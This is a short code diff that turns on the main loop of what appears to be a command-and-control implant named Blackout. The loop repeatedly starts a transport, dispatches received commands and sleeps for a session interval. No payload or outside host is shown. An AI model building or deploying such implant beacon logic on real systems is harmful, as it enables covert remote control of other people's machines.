@@ -7,20 +7,14 @@ FUNC VOID BlackoutMain(
     BLACKOUT_INSTANCE
     
     BlackoutInit();
-
-    while( 1 ) {
-        SleepMain( 5 * 1000 );
-    }
-
-    return;
-    /*
+    
     do {
-        if ( !Instance()->Config.Session.Connected ) {
+        if ( !Instance()->Session.Connected ) {
             if ( TransportInit() )
                 CommandDispatcher();
         }
-        Sleep( Instance()->Config.Session.SleepTime * 3 );
+        SleepMain( Instance()->Session.SleepTime * 1000 );
     } while ( TRUE );
-    */
+    
 }
 
